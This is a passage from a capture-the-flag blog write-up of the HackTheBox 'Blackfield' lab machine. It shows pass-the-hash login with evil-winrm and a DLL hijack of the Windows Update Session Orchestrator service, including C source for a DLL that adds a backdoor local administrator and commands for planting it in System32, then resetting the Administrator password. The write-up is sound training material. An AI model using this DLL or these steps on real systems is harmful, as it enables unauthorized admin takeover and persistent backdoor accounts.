</pre></table></code></div></div><p>Getting a WinRM shell using Administrator hash:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ evil-winrm <span class="nt">-i</span> 10.10.10.192 <span class="nt">-u</span> Administrator <span class="nt">-H</span> <span class="s1">'184fb5e5178480be64824d4cd53b99ee'</span>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>blackfield<span class="se">\a</span>dministrator
</pre></table></code></div></div><h2 id="privesc-method-3---dll-hijack">PrivEsc Method #3 - DLL Hijack</h2><p>Kudos to <a href="https://twitter.com/snowscan"><strong>snowscan</strong></a> for showcasing this privilege escalation method in this <a href="https://snowscan.io/htb-writeup-blackfield/#"><strong>blog</strong></a>.</p><p>In this method we’ll abuse <code class="language-plaintext highlighter-rouge">Update Session Orchestrator (USO)</code> service which runs as NT AUTHORITY\System and tries to load a non-existent DLL (windowscoredeviceinfo.dll) whenever an Update Session is created.</p><p>To understand this exploitation method I referred this <a href="https://github.com/itm4n/UsoDllLoader"><strong>PoC</strong></a></p><p>Since <code class="language-plaintext highlighter-rouge">svc_backup</code> user is an member of <code class="language-plaintext highlighter-rouge">Backup Operator</code> Group, the user is allowed to write files anywhere on the system. For DLL hijacking, the malicious <code class="language-plaintext highlighter-rouge">windowscoredeviceinfo.dll</code> will be created by using the following code:</p><p>This dll will create a new user with credentials <code class="language-plaintext highlighter-rouge">coldfusion:c0!dfusion</code> and add it to local administrators group.</p><h4 id="creating-dll">Creating DLL</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield/Hijack
→ <span class="nb">cat </span>dllhijack.c
<span class="c">#include &lt;windows.h&gt;</span>
<span class="c">#include &lt;stdio.h&gt;</span>
<span class="c">#include &lt;stdlib.h&gt;</span>


int pwn<span class="o">()</span>
<span class="o">{</span>
        WinExec<span class="o">(</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32</span><span class="se">\\</span><span class="s2">net.exe users coldfusion c0!dfusion /add"</span>, 0<span class="o">)</span><span class="p">;</span>
        WinExec<span class="o">(</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32</span><span class="se">\\</span><span class="s2">net.exe localgroup administrators coldfusion /add"</span>, 0<span class="o">)</span><span class="p">;</span>
        <span class="k">return </span>0<span class="p">;</span>
<span class="o">}</span>

BOOL APIENTRY DllMain<span class="o">(</span>HMODULE hModule,
        DWORD  ul_reason_for_call,
        LPVOID lpReserved
<span class="o">)</span>
<span class="o">{</span>
        switch <span class="o">(</span>ul_reason_for_call<span class="o">)</span>
        <span class="o">{</span>
        <span class="k">case</span> DLL_PROCESS_ATTACH:
                pwn<span class="o">(</span><span class="p">);</span>
        <span class="k">case</span> DLL_THREAD_ATTACH:
        <span class="k">case</span> DLL_THREAD_DETACH:
        <span class="k">case</span> DLL_PROCESS_DETACH:
                <span class="nb">break</span><span class="p">;</span>
        <span class="o">}</span>
        <span class="k">return </span>TRUE<span class="p">;</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Compiling the dll:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield/Hijack
→ x86_64-w64-mingw32-gcc dllhijack.c <span class="nt">-shared</span> <span class="nt">-o</span> windowscoredeviceinfo.dll

cfx:  ~/Documents/htb/blackfield/Hijack
→ <span class="nb">ls
</span>dllhijack.c  windowscoredeviceinfo.dll
</pre></table></code></div></div><h4 id="uploading-files">Uploading files</h4><p>Creating temporary directories and uploading <code class="language-plaintext highlighter-rouge">windowscoredeviceinfo.dll</code> &amp; <code class="language-plaintext highlighter-rouge">UsoDllLoader.exe</code> required for the attack, UsoDllLoader.exe can be downloaded from <a href="https://github.com/itm4n/UsoDllLoader/releases/tag/1.0-20190824"><strong>here</strong></a> or you can also download it from my GitHub <a href="https://github.com/ColdFusionX/CTF-Scripts/tree/master/HTB/BlackField"><strong>repo</strong></a></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">mkdir </span>c:<span class="se">\t</span>emp
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">mkdir </span>c:<span class="se">\t</span>emp<span class="se">\d</span>ll
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>c:<span class="se">\t</span>emp<span class="se">\d</span>ll

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\t</span>emp<span class="se">\d</span>ll&gt; upload windowscoredeviceinfo.dll
Info: Uploading windowscoredeviceinfo.dll to C:<span class="se">\t</span>emp<span class="se">\d</span>ll<span class="se">\w</span>indowscoredeviceinfo.dll


Data: 122268 bytes of 122268 bytes copied

Info: Upload successful!

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\t</span>emp<span class="se">\d</span>ll&gt; <span class="nb">cd</span> ..
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\t</span>emp&gt; upload UsoDllLoader.exe
Info: Uploading UsoDllLoader.exe to C:<span class="se">\t</span>emp<span class="se">\U</span>soDllLoader.exe


Data: 192512 bytes of 192512 bytes copied

Info: Upload successful!

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\t</span>emp&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\t</span>emp


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        10/5/2020   5:24 PM                dll
<span class="nt">-a----</span>        10/5/2020   5:37 PM         144384 UsoDllLoader.exe
</pre></table></code></div></div><p>Now we will use robocopy to copy <code class="language-plaintext highlighter-rouge">windowscoredeviceinfo.dll</code> from <code class="language-plaintext highlighter-rouge">C:\temp\dll\</code> inside <code class="language-plaintext highlighter-rouge">c:\windows\system32</code>:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\t</span>emp&gt; robocopy /b dll c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32 windowscoredeviceinfo.dll

<span class="nt">-------------------------------------------------------------------------------</span>
   ROBOCOPY     ::     Robust File Copy <span class="k">for </span>Windows
<span class="nt">-------------------------------------------------------------------------------</span>

  Started : Monday, October 5, 2020 5:37:29 PM
   Source : C:<span class="se">\t</span>emp<span class="se">\d</span>ll<span class="se">\</span>
     Dest : c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\</span>

    Files : windowscoredeviceinfo.dll

  Options : <span class="k">*</span>.<span class="k">*</span> /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

<span class="nt">------------------------------------------------------------------------------</span>

                           1    C:<span class="se">\t</span>emp<span class="se">\s</span>ystem32<span class="se">\</span>
        <span class="k">*</span>EXTRA Dir        <span class="nt">-1</span>    c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\0</span>409<span class="se">\</span>
        <span class="k">*</span>EXTRA Dir        <span class="nt">-1</span>    c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\A</span>DDSDeployment_Internal<span class="se">\</span>
        <span class="k">*</span>EXTRA Dir        <span class="nt">-1</span>    c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\a</span>dprep<span class="se">\</span>
        <span class="k">*</span>EXTRA Dir        <span class="nt">-1</span>    c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\A</span>dvancedInstallers<span class="se">\</span>
        <span class="k">*</span>EXTRA Dir        <span class="nt">-1</span>    c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\a</span>m-et<span class="se">\</span>

<span class="o">[</span>..SNIP..]

        <span class="k">*</span>EXTRA File             143360        xwtpw32.dll
        <span class="k">*</span>EXTRA File              79872        zipcontainer.dll
        <span class="k">*</span>EXTRA File             429568        zipfldr.dll
        <span class="k">*</span>EXTRA File              30720        ztrace_maps.dll
          New File               91702        windowscoredeviceinfo.dll
  0%
 71%
100%
</pre></table></code></div></div><p>As we can see a New File <code class="language-plaintext highlighter-rouge">windowscoredeviceinfo.dll</code> has been coping inside <code class="language-plaintext highlighter-rouge">c:\windows\system32\</code></p><h4 id="trigger-dll">Trigger DLL</h4><p>Trigger the DLL using UsoDllLoader exploit, we can ignore the error messages as the exploit was originally build to generate a bind shell:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>.<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\t</span>emp&gt; .<span class="se">\U</span>soDllLoader.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using UpdateOrchestrator-&gt;StartScan<span class="o">()</span>
    |__ Creating instance of <span class="s1">'UpdateSessionOrchestrator'</span>... Done.
    |__ Creating a new Update Session... Done.
    |__ Calling <span class="s1">'StartScan'</span>... Done.
<span class="o">[</span>-] Unable to connect to server!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Retrying with UpdateOrchestrator-&gt;StartInteractiveScan<span class="o">()</span>
    |__ Creating instance of <span class="s1">'UpdateSessionOrchestrator'</span>... Done.
    |__ Creating a new Update Session... Done.
    |__ Calling <span class="s1">'StartInteractiveScan'</span>... Done.
<span class="o">[</span>-] Unable to connect to server!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Retrying with UpdateOrchestrator-&gt;StartDownload<span class="o">()</span>
    |__ Creating instance of <span class="s1">'UpdateSessionOrchestrator'</span>... Done.
    |__ Creating a new Update Session... Done.
    |__ Calling <span class="s1">'StartInteractiveScan'</span>... Done.
<span class="o">[</span>-] Unable to connect to server!
<span class="o">[</span>-] Exploit failed.
</pre></table></code></div></div><h4 id="local-administrator">Local Administrator</h4><p>We can see new user <code class="language-plaintext highlighter-rouge">coldfusion</code> has been created with local administrator privileges:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\t</span>emp&gt; net <span class="nb">users </span>coldfusion
User name                    coldfusion
Full Name
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/5/2020 5:38:18 PM
Password expires             11/16/2020 5:38:18 PM
Password changeable          10/6/2020 5:38:18 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.
</span></pre></table></code></div></div><p>Logging in with new local admin creds:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield/Hijack
→ evil-winrm <span class="nt">-i</span> 10.10.10.192 <span class="nt">-u</span> coldfusion <span class="nt">-p</span> <span class="s1">'c0!dfusion'</span>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\c</span>oldfusion<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>blackfield<span class="se">\c</span>oldfusion

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        2/28/2020   4:36 PM            447 notes.txt
<span class="nt">-ar---</span>        10/3/2020   3:31 PM             34 root.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop&gt; get-content root.txt
Access to the path <span class="s1">'C:\users\administrator\desktop\root.txt'</span> is denied.

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords <span class="nt">--</span> Done.
- change krbtgt password twice <span class="nt">--</span> Done.
- disable auditor<span class="s1">'s account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup &amp; restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
</span></pre></table></code></div></div><p>Even after becoming a Local admin we are unable to read <code class="language-plaintext highlighter-rouge">root.txt</code>, looking the <code class="language-plaintext highlighter-rouge">notes.txt</code> we understand the file is encrypted.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop&gt; cipher /c root.txt

 Listing C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\</span>
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows Vista/Server 2008
</pre></table></code></div></div><p>It seems the file has been encrypted with a certificate and only Administrator has authority to access it, so we will just change the password of <code class="language-plaintext highlighter-rouge">Administrator</code>:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\u</span>sers<span class="se">\c</span>oldfusion<span class="se">\D</span>ocuments&gt; net <span class="nb">users </span>administrator c0!dfusion
The <span class="nb">command </span>completed successfully.
</pre></table></code></div></div><p>Now, We have changed the password of administrator as <code class="language-plaintext highlighter-rouge">c0!dfusion</code></p><h4 id="administrator-shell-2">Administrator Shell</h4><p>Shell with Administrator creds:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield/Hijack
→ evil-winrm <span class="nt">-i</span> 10.10.10.192 <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'c0!dfusion'</span>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ../Desktop
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">whoami
</span>blackfield<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; get-content root.txt
49160cc348b7263<span class="k">*****************</span>

</pre></table></code></div></div><p>And we pwned the Box !</p><p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/windows-machines/'>Windows Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/blackfield/" class="post-tag no-text-decoration" >Blackfield</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/crackmapexec/" class="post-tag no-text-decoration" >crackmapexec</a> <a href="/tags/smbclient/" class="post-tag no-text-decoration" >smbclient</a> <a href="/tags/kerbrute/" class="post-tag no-text-decoration" >kerbrute</a> <a href="/tags/as-rep-roast/" class="post-tag no-text-decoration" >as-rep-roast</a> <a href="/tags/john/" class="post-tag no-text-decoration" >john</a> <a href="/tags/bloodhound/" class="post-tag no-text-decoration" >bloodhound</a> <a href="/tags/bloodhound-py/" class="post-tag no-text-decoration" >bloodhound-py</a> <a href="/tags/rpc-password-reset/" class="post-tag no-text-decoration" >rpc-password-reset</a> <a href="/tags/pypykatz/" class="post-tag no-text-decoration" >pypykatz</a> <a href="/tags/evil-winrm/" class="post-tag no-text-decoration" >evil-winrm</a> <a href="/tags/sebackupprivilege/" class="post-tag no-text-decoration" >sebackupprivilege</a> <a href="/tags/wbadmin/" class="post-tag no-text-decoration" >wbadmin</a> <a href="/tags/diskshadow/" class="post-tag no-text-decoration" >diskshadow</a> <a href="/tags/robocopy/" class="post-tag no-text-decoration" >robocopy</a> <a href="/tags/copy-filesepackupprivilege/" class="post-tag no-text-decoration" >copy-filesepackupprivilege</a> <a href="/tags/ntds/" class="post-tag no-text-decoration" >ntds</a> <a href="/tags/system/" class="post-tag no-text-decoration" >system</a> <a href="/tags/secretsdump/" class="post-tag no-text-decoration" >secretsdump</a> <a href="/tags/hash/" class="post-tag no-text-decoration" >hash</a> <a href="/tags/cipher/" class="post-tag no-text-decoration" >cipher</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox — Blackfield Writeup - b3t4m3&url=http://localhost:4000/posts/Blackfield-HTB/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox — Blackfield Writeup - b3t4m3&u=http://localhost:4000/posts/Blackfield-HTB/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank"> <i class="fa-fw "></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PassageHTB/">HackTheBox — Passage Writeup</a></li><li><a href="/posts/Doctor-HTB/">HackTheBox — Doctor Writeup</a></li><li><a href="/posts/Omni-HTB/">HackTheBox — Omni Writeup</a></li><li><a href="/posts/Fuse-HTB/">HackTheBox — Fuse Writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Fuse-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Nov 3, 2020 <i class="unloaded">2020-11-03T07:50:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Fuse Writeup</h3><div class="text-muted small"><p> Fuse is based on Printers in corporate environment making it quite realistic machine, We’ll complete it using both Intended and Unintended method. We start off with web enumeration of a printer ...</p></div></div></a></div><div class="card"> <a href="/posts/Tabby-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Nov 12, 2020 <i class="unloaded">2020-11-12T06:50:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Tabby Writeup</h3><div class="text-muted small"><p> Tabby was a user friendly easy level box put together with interesting attack vectors. We start off with discovering Local File Inclusion (LFI) in a website and leverage it to expose credentials...</p></div></div></a></div><div class="card"> <a href="/posts/Cache-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 16, 2020 <i class="unloaded">2020-10-16T06:50:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Cache Writeup</h3><div class="text-muted small"><p> Cache was a fun box, Initial web enumeration leads us to hardcoded credentials stored inside simple login page which uses client side validation, then discover a new VHost running a vulnerable i...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/AdmirerHTB/" class="btn btn-outline-primary"><p>HackTheBox — Admirer Writeup</p></a> <a href="/posts/Cache-HTB/" class="btn btn-outline-primary"><p>HackTheBox — Cache Writeup</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//b3t4m3.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/Blackfield-HTB/'; this.page.identifier = '/posts/Blackfield-HTB/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ColdFusionX" data-description="Your Support means the World to me !" data-message="Thank you for visiting. Hope you liked my Blog!" data-color="#5F7FFF" data-position="" data-x_margin="18" data-y_margin="18"></script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/bet4m3">Carlos Sequeira</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <script src="https://www.hackthebox.eu/badge/163155"></script></p></div><div class="footer-right"><p class="mb-0"><h4>Realm of Knowledge</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
